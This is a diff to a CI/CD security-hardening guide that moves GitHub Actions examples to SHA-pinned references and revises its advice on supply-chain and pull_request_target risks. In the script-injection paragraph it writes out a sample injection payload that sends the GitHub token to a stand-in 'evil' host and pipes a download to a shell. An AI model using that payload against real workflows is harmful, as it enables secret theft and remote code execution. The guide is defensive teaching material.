@@ -82,7 +82,7 @@ Pipeline design, security hardening, and optimization across GitHub Actions, Git
 
 ## Examples
 
-Examples are trimmed skeletons — repeat `checkout`/`setup-*` steps per job (jobs don't share a workspace). **All third-party actions must be SHA-pinned in real use** (shown as `@<sha>`); official `actions/*` shown with tags for brevity.
+Examples are trimmed skeletons — repeat `checkout`/`setup-*` steps per job (jobs don't share a workspace). **Pin every action, including `actions/*`, to a reviewed full commit SHA in real use**; retain the action major only as a comment for update tooling.
 
 ### GitHub Actions: full pipeline
 
@@ -106,8 +106,8 @@ jobs:
         options: >-
           --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: actions/setup-node@<full-commit-sha> # v4
         with: { node-version: "20", cache: "npm" }   # cache keyed on lock file automatically
       - run: npm ci
       - run: npm test -- --coverage
@@ -118,19 +118,19 @@ jobs:
     runs-on: ubuntu-latest
     permissions: { contents: read, packages: write }   # only this job can push
     steps:
-      - uses: actions/checkout@v4
-      - uses: docker/setup-buildx-action@v3            # REQUIRED for type=gha cache
-      - uses: docker/login-action@v3
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: docker/setup-buildx-action@<full-commit-sha> # v3; REQUIRED for type=gha cache
+      - uses: docker/login-action@<full-commit-sha> # v3
         with: { registry: "${{ env.REGISTRY }}", username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
       - id: meta
-        uses: docker/metadata-action@v5
+        uses: docker/metadata-action@<full-commit-sha> # v5
         with:
           images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
           tags: |
             type=sha,prefix=
             type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
       - id: build
-        uses: docker/build-push-action@<sha>           # v6
+        uses: docker/build-push-action@<full-commit-sha> # v6
         with:
           context: .
           push: true
@@ -147,7 +147,7 @@ jobs:
     runs-on: ubuntu-latest
     environment: production                            # gates/approvals configured on the environment
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@<full-commit-sha> # v4
       - name: Deploy by immutable digest
         run: kubectl set image deployment/app app=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.digest }}
 ```
@@ -178,7 +178,8 @@ test:
 
 deploy-production:
   stage: deploy
-  image: bitnami/kubectl:latest
+  # Pin a reviewed digest in the real pipeline; a tag is only illustrative here.
+  image: bitnami/kubectl@sha256:<reviewed-digest>
   script:
     - kubectl set image deployment/app app=$IMAGE_TAG -n production
     - kubectl rollout status deployment/app -n production --timeout=300s
@@ -198,8 +199,8 @@ jobs:
       id-token: write        # REQUIRED for OIDC — omit and the token request silently returns empty
       contents: read
     steps:
-      - uses: actions/checkout@<sha>
-      - uses: aws-actions/configure-aws-credentials@<sha>   # mints short-lived STS creds
+      - uses: actions/checkout@<full-commit-sha> # current approved major
+      - uses: aws-actions/configure-aws-credentials@<full-commit-sha> # current approved major; mints short-lived STS creds
         with:
           role-to-assume: arn:aws:iam::123456789012:role/gh-deploy   # trust policy: sub StringEquals repo:org/repo:environment:production
           aws-region: ${{ inputs.aws-region }}
@@ -215,22 +216,23 @@ jobs:
     runs-on: ubuntu-latest
     permissions: { security-events: write, contents: read }   # upload-sarif needs this
     steps:
-      - uses: actions/checkout@v4
-      - uses: github/codeql-action/init@v3
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: github/codeql-action/init@<full-commit-sha> # v3
         with: { languages: "javascript, python" }
-      - uses: github/codeql-action/autobuild@v3
-      - uses: github/codeql-action/analyze@v3
+      - uses: github/codeql-action/autobuild@<full-commit-sha> # v3
+      - uses: github/codeql-action/analyze@<full-commit-sha> # v3
 
   scan:
     runs-on: ubuntu-latest
+    permissions: { contents: read, security-events: write } # upload-sarif needs security-events
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@<full-commit-sha> # v4
         with: { fetch-depth: 0 }              # full history for secret detection
-      - uses: aquasecurity/trivy-action@<sha> # fs + image scanning; never @master
+      - uses: aquasecurity/trivy-action@<full-commit-sha> # current reviewed major; never a mutable branch
         with: { scan-type: fs, scan-ref: ".", format: sarif, output: trivy.sarif, severity: "CRITICAL,HIGH" }
-      - uses: github/codeql-action/upload-sarif@v3
+      - uses: github/codeql-action/upload-sarif@<full-commit-sha> # v3
         with: { sarif_file: trivy.sarif }
-      - uses: trufflesecurity/trufflehog@<sha>
+      - uses: trufflesecurity/trufflehog@<full-commit-sha>
         with: { base: "${{ github.event.repository.default_branch }}", head: HEAD }
 ```
 
@@ -246,8 +248,8 @@ jobs:
       matrix: { node: [18, 20, 22], os: [ubuntu-latest, macos-latest] }
     runs-on: ${{ matrix.os }}
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: actions/setup-node@<full-commit-sha> # v4
         with: { node-version: "${{ matrix.node }}", cache: npm }
       - run: npm ci && npm test
   integration:
@@ -265,8 +267,8 @@ jobs:
     runs-on: ubuntu-latest
     outputs: { api: "${{ steps.f.outputs.api }}", web: "${{ steps.f.outputs.web }}" }
     steps:
-      - uses: actions/checkout@v4
-      - uses: dorny/paths-filter@<sha>
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: dorny/paths-filter@<full-commit-sha> # current approved major
         id: f
         with:
           filters: |
@@ -276,7 +278,7 @@ jobs:
     needs: changes
     if: needs.changes.outputs.api == 'true'   # skip unchanged services
     runs-on: ubuntu-latest
-    steps: [{ uses: actions/checkout@v4 }]     # ... build/test api
+    steps: [{ uses: actions/checkout@<full-commit-sha> }] # v4; build/test api
 ```
 
 Alternatives to hand-rolled filtering: Turborepo/Nx `affected` graphs, Bazel — they compute the change-impact DAG and skip unaffected targets.
@@ -290,13 +292,13 @@ jobs:
     needs: data-validation                    # Great Expectations / schema check on DVC-pulled data first
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
+      - uses: actions/checkout@<full-commit-sha> # v4
+      - uses: actions/setup-python@<full-commit-sha> # v5
         with: { python-version: "3.11", cache: pip }
       - run: pip install -r requirements.txt mlflow
       - run: python training/train.py --model-version ${{ inputs.model-version || github.sha }}   # tag model with git SHA
         env: { MLFLOW_TRACKING_URI: "${{ secrets.MLFLOW_TRACKING_URI }}" }
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@<full-commit-sha> # v4
         with: { name: trained-model, path: models/output/ }
   evaluate:
     needs: train
@@ -334,7 +336,7 @@ High-signal practices distilled from official platform docs and supply-chain inc
 
 ### Security
 
-**Pin third-party actions to a full commit SHA, never a tag or branch.** `uses: owner/action@v4` and `@main`/`@master` are mutable git refs: the maintainer (or an attacker who compromises the repo or a PAT) can force-push the tag/branch to different code, and every consumer silently runs it on the next trigger. This is the exact mechanism of tj-actions/changed-files (CVE-2025-30066, March 2025) — tags repointed to a single malicious commit that dumped runner memory (secrets) into logs across 23,000+ repos; trivy-action was hit similarly. A 40-char SHA is content-addressed (Git addresses objects by SHA-1 of their content) so it resolves to exactly one tree of bytes forever; a tag is just a named pointer with no such guarantee. `@main`/`@master` is the worst case — it advances on every push. Pair SHA pins with Dependabot/Renovate so you still get update PRs.
+**Pin every external action to a reviewed full commit SHA, never a tag or branch.** `uses: owner/action@v4` and `@main`/`@master` are mutable refs, so upstream compromise or ref movement can change what the next workflow run executes. GitHub documents a full-length commit SHA as the only immutable action release reference. Verify that the SHA comes from the action's original repository, retain the release major in a comment, and use Dependabot/Renovate to propose reviewed pin updates.
 
 ```yaml
 - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
@@ -366,7 +368,7 @@ deploy:
         --web-identity-token "$AWS_OIDC_TOKEN" --role-session-name gitlab-$CI_JOB_ID
 ```
 
-**Never use `pull_request_target` while checking out fork code — use the two-workflow split.** `pull_request_target` runs in the BASE repo context with a write-scoped token and full secret visibility, even for fork PRs. Adding `actions/checkout` with `ref: github.event.pull_request.head.sha` to "test the PR" materializes attacker code inside that privileged context, so any subsequent `npm install`/`make` runs attacker-controlled postinstall hooks with the write token and secrets in memory (a "pwn request" / Poisoned Pipeline Execution). The durable fix is a hard split: Workflow 1 (`on: pull_request`, `permissions: {}`) runs the untrusted code and uploads results as an artifact; Workflow 2 (`on: workflow_run`, has secrets/write) downloads that artifact and treats its contents as **untrusted data** — never executing it or writing it to `GITHUB_ENV`. (actions/checkout@v7, GA June 2026, refuses fork-PR checkout under `pull_request_target` by default, but the split is the durable mitigation.)
+**Never use `pull_request_target` while checking out fork code — use the two-workflow split.** `pull_request_target` runs in the BASE repo context with a write-scoped token and full secret visibility, even for fork PRs. Adding `actions/checkout` with `ref: github.event.pull_request.head.sha` to "test the PR" materializes attacker code inside that privileged context, so any subsequent `npm install`/`make` runs attacker-controlled postinstall hooks with the write token and secrets in memory (a "pwn request" / Poisoned Pipeline Execution). The durable fix is a hard split: Workflow 1 (`on: pull_request`, `permissions: {}`) runs the untrusted code and uploads results as an artifact; Workflow 2 (`on: workflow_run`, has secrets/write) downloads that artifact and treats its contents as **untrusted data** — never executing it or writing it to `GITHUB_ENV`. Do not rely on a particular action version's guardrails as the control; preserve the privilege boundary in workflow design.
 
 **Route untrusted context values through env vars to prevent script injection.** `${{ expression }}` is evaluated at workflow-*generation* time, BEFORE the shell parses `run:` — so the value is string-substituted into the script source. A user-controlled field (PR title, branch name, commit message) interpolated inline lets an attacker supply `a"; curl evil/$GITHUB_TOKEN | sh; echo "` which then executes. Assign the expression to an `env:` var and reference `"$VAR"`: the value lands in memory as a string before generation, and the shell resolves the variable *after* parsing, so metacharacters stay data. GitHub Security Lab treats any field ending in body/title/message/name/ref/label/head_ref/email/default_branch/page_name as untrusted.
 
@@ -392,10 +394,10 @@ deploy:
 
 **Generate SLSA provenance for release artifacts — but know its limits.** `actions/attest-build-provenance` (GA June 2024) uses Sigstore to bind an artifact's digest to the workflow run, repo, commit, and trigger, reaching SLSA Build L2 out of the box; consumers verify with `gh attestation verify`. Required: `id-token: write` (mint the Sigstore cert) and `attestations: write` (persist it) — missing either fails, often only surfacing at verification. **Crucial nuance:** provenance attests build *identity*, not input *cleanliness* — it signs whatever the workflow produced, including an artifact built from a poisoned cache. Pair it with lock-file install (`npm ci`), no cache restore in the publish job, and SHA-pinned actions.
 
-**Add SBOM and explicit provenance to Docker images with build-push-action v6+; never pass secrets via `--build-arg`.** Since v4, provenance attestations are added automatically (public repos `mode=max`, private `mode=min`); SBOM is NOT automatic — set `sbom: true`. Both require pushing to a registry and are incompatible with `load: true`. Security gotcha: build args appear in `mode=max` provenance on public repos, so pass secrets via BuildKit secret mounts (`secrets:`), never `build-args`. Current major is v6 (v7 available 2026); pin to a SHA regardless.
+**Add SBOM and explicit provenance to Docker images; never pass secrets via `--build-arg`.** Buildx can attach provenance and an SBOM when the image is pushed; confirm the installed action's documented defaults and set `provenance:`/`sbom:` explicitly rather than relying on a changing action major. Attestations need a registry push and are incompatible with `load: true`. Security gotcha: build args can appear in provenance, so pass secrets via BuildKit secret mounts (`secrets:`), never `build-args`. Pin the action to a reviewed SHA regardless.
 
 ```yaml
-- uses: docker/build-push-action@<sha>  # v6
+- uses: docker/build-push-action@<full-commit-sha> # v6
   with:
     context: .
     push: true
@@ -434,7 +436,7 @@ concurrency: { group: "deploy-${{ github.workflow }}-production", cancel-in-prog
 **GitHub Actions cache key: scope by `runner.os`, key on the lock file, keep restore-keys narrow.** (1) Omitting `runner.os` lets Linux and macOS share a cache — native/compiled binaries built for one OS fail on the other. (2) Keying on source (`hashFiles('**/*.ts')`) misses the cache on every code change; key on the dependency LOCK file (`package-lock.json`, `Cargo.lock`), which changes only when deps change. (3) `restore-keys` are prefix-matched by recency, so a too-broad fallback can restore an arbitrary stale/incompatible cache — keep the prefix specific.
 
 ```yaml
-- uses: actions/cache@v4
+- uses: actions/cache@<full-commit-sha> # v4
   with:
     path: ~/.npm
     key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
@@ -445,8 +447,8 @@ concurrency: { group: "deploy-${{ github.workflow }}-production", cancel-in-prog
 **`type=gha` Docker cache requires Buildx and silently no-ops otherwise.** The `type=gha` BuildKit backend is NOT supported by the default `docker` driver on GitHub-hosted runners — it needs a `docker-container`/`docker-buildx` builder. Without `docker/setup-buildx-action` before `docker/build-push-action`, `cache-from`/`cache-to: type=gha` are silently ignored: zero read, zero write, no error. Also: `BUILDKIT_INLINE_CACHE=1` is a build-arg for the *registry* inline-cache mechanism — it has no effect with `type=gha` and just adds confusion; and multiple image builds in one job sharing the default scope overwrite each other's cache, so give each a distinct `scope=`.
 
 ```yaml
-- uses: docker/setup-buildx-action@<sha>   # REQUIRED before the gha backend
-- uses: docker/build-push-action@<sha>     # v6
+- uses: docker/setup-buildx-action@<full-commit-sha> # current approved major; REQUIRED before gha backend
+- uses: docker/build-push-action@<full-commit-sha> # v6
   with:
     cache-from: type=gha,scope=api
     cache-to: type=gha,mode=max,scope=api   # distinct scope per image
